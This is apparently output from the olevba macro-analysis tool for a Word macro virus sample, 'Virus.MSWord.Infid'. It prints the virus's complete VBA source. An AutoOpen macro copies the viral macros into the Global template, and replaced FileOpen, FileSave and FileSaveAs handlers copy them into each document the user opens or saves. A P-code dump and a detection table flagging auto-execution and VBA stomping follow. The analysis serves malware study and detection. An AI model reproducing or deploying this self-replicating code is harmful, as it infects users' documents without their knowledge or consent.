olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Infid
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MsWord 
in file: Virus.MSWord.Infid - OLE stream: 'MsWord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Microsoft Word", "MS WORD", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: Virus.MSWord.Infid - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FN$
Dim ID
Dim I
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
ID = 0
For I = 1 To WordBasic.CountMacros(0)
    If UCase(WordBasic.[MacroName$](I, 0)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy FN$ + ":FileOpen", "Global:FileOpen"
WordBasic.MacroCopy FN$ + ":FileSave", "Global:FileSave"
WordBasic.MacroCopy FN$ + ":FileSaveAs", "Global:FileSaveAs"
WordBasic.MacroCopy FN$ + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy FN$ + ":MsWord", "Global:MSWord"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen 
in file: Virus.MSWord.Infid - OLE stream: 'FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim FN$
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
Dim inf As Object: Set inf = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
FN$ = WordBasic.[FileName$]()
WordBasic.CurValues.FileSaveAs inf
inf.Name = FN$
inf.Format = 1
WordBasic.FileSaveAs inf
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave 
in file: Virus.MSWord.Infid - OLE stream: 'FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim FN$
Dim ID
Dim I
On Error GoTo -1: On Error GoTo Abort
Dim inf As Object: Set inf = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.FileSave
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.CurValues.FileSaveAs inf
inf.Name = WordBasic.[FileName$]()
inf.Format = 1
WordBasic.FileSaveAs inf
ID = 0
For I = 1 To WordBasic.CountMacros(1)
    If UCase(WordBasic.[MacroName$](I, 1)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy "Global:FileOpen", FN$ + ":FileOpen"
WordBasic.MacroCopy "Global:FileSave", FN$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSaveAs", FN$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen"
WordBasic.MacroCopy "Global:MSWord", FN$ + ":MsWord"
WordBasic.FileSaveAs inf
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs 
in file: Virus.MSWord.Infid - OLE stream: 'FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim FN$
Dim ID
Dim I
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
dlg.Format = 1
WordBasic.FileSaveAs dlg
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
ID = 0
For I = 1 To WordBasic.CountMacros(1)
    If UCase(WordBasic.[MacroName$](I, 1)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy "Global:FileOpen", FN$ + ":FileOpen"
WordBasic.MacroCopy "Global:FileSave", FN$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSaveAs", FN$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen"
WordBasic.MacroCopy "Global:MSWord", FN$ + ":MsWord"
WordBasic.FileSaveAs dlg
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Infid - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Infid
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileOpen - 1715 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn FN
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #4:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #5:
' 	Dim 
' 	VarDefn inf (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set inf 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #10:
' 	Ld inf 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld FN$ 
' 	Ld inf 
' 	MemSt New 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld inf 
' 	MemSt Format$ 
' Line #13:
' 	Ld inf 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #14:
' 	Label Abort 
' Line #15:
' 	EndSub 
' Macros/VBA/FileSave - 2432 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn FN
' Line #3:
' 	Dim 
' 	VarDefn ID
' Line #4:
' 	Dim 
' 	VarDefn I
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #6:
' 	Dim 
' 	VarDefn inf (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set inf 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St FN$ 
' Line #9:
' 	Ld inf 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld inf 
' 	MemSt New 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld inf 
' 	MemSt Format$ 
' Line #12:
' 	Ld inf 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	LitDI2 0x0000 
' 	St ID 
' Line #14:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #15:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "MSWORD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ID 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld ID 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld FN$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld FN$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld FN$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld FN$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	LitStr 0x000D "Global:MSWord"
' 	Ld FN$ 
' 	LitStr 0x0007 ":MsWord"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld inf 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Label Abort 
' Line #26:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

